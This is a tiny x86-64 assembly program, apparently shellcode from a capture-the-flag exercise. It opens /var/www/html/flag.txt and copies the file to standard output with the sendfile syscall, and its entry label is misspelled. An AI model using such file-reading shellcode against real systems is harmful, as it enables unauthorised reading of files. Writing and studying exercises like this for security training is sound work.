.global _shart
_start:
.intel_syntax noprefix
	mov rax, 2
	lea rdi, [rip+flagFile]
	mov rsi, 0
	mov rdx, 0
	syscall

	mov rdi, 1
	mov rsi, rax
	mov rdx, 0
	mov r10, 1000
	mov rax, 40
	syscall

	mov rax, 60
	syscall


flagFile:
	.string "/var/www/html/flag.txt"